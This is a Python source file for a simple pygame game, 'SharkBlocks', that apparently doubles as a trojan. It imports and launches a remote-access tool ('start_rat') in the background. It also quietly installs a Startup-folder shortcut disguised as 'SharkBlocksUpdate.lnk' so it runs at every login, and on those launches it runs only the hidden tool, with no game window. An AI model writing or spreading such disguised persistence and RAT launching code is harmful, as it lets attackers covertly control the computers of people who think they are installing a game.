import pygame
import random
import sys
import os
from win32com.client import Dispatch
import asyncio
import threading
from rat.root import start_rat  # Ensure this is the correct import
from rat.functions.sharks import sharks
import websockets


WEBSOCKET_SERVER = "ws://localhost:6969"

DEATH = False
game_running = False  # Global flag to track if a game instance is running

# Add to startup function
def addstart():
    startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    exe_path = os.path.abspath(sys.argv[0])
    shortcut_path = os.path.join(startup_folder, "SharkBlocksUpdate.lnk")
    
    if os.path.exists(shortcut_path):
        return
    
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = exe_path
    shortcut.Arguments = "--startup"
    shortcut.WorkingDirectory = os.path.dirname(exe_path)
    shortcut.save()

def run_game():
    pygame.init()

    SCREEN_WIDTH = 800
    SCREEN_HEIGHT = 600
    WHITE = (255, 255, 255)
    BLUE = (0, 0, 255)
    RED = (255, 0, 0)
    PLAYER_WIDTH = 50
    PLAYER_HEIGHT = 50
    PLAYER_SPEED = 7
    BLOCK_WIDTH = 50
    BLOCK_HEIGHT = 50
    BLOCK_SPEED_START = 5
    BLOCK_SPEED_INCREMENT = 0.5

    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    pygame.display.set_caption("SharkBlocks")
    font = pygame.font.Font(None, 36)

    def draw_text(text, color, x, y):
        label = font.render(text, True, color)
        screen.blit(label, (x, y))

    player_x = SCREEN_WIDTH // 2 - PLAYER_WIDTH // 2
    player_y = SCREEN_HEIGHT - PLAYER_HEIGHT - 10

    blocks = []
    block_speed = BLOCK_SPEED_START
    score = 0

    game_running = True  # Mark the game as running

    running = True
    while running:
        screen.fill(WHITE)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False  # Exit the game loop

        keys = pygame.key.get_pressed()
        if keys[pygame.K_LEFT] and player_x > 0:
            player_x -= PLAYER_SPEED
        if keys[pygame.K_RIGHT] and player_x < SCREEN_WIDTH - PLAYER_WIDTH:
            player_x += PLAYER_SPEED

        if random.random() < 0.02:
            block_x = random.randint(0, SCREEN_WIDTH - BLOCK_WIDTH)
            blocks.append(pygame.Rect(block_x, 0, BLOCK_WIDTH, BLOCK_HEIGHT))

        for block in blocks[:]:
            block.y += block_speed
            if block.colliderect(pygame.Rect(player_x, player_y, PLAYER_WIDTH, PLAYER_HEIGHT)):
                if DEATH:
                    running = False
                else:
                    blocks.remove(block)
            if block.y > SCREEN_HEIGHT:
                blocks.remove(block)
                score += 1

        block_speed = BLOCK_SPEED_START + score // 10 * BLOCK_SPEED_INCREMENT

        pygame.draw.rect(screen, BLUE, (player_x, player_y, PLAYER_WIDTH, PLAYER_HEIGHT))
        for block in blocks:
            pygame.draw.rect(screen, RED, block)

        draw_text(f"Score: {score}", (0, 0, 0), 10, 10)

        pygame.display.flip()
        pygame.time.delay(16)  # Sleep for ~1/60 seconds to maintain frame rate

    pygame.quit()  

async def start_background_tasks():
    await asyncio.gather(
        start_rat(),  

    )

def start_game_thread():
    # Run the Pygame window in a separate thread
    game_thread = threading.Thread(target=run_game)
    game_thread.daemon = True 
    game_thread.start()

async def main():
    if "--startup" not in sys.argv:
      start_game_thread()
    await start_background_tasks()
    
    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    addstart()

    # Run the main async function
    asyncio.run(main())  
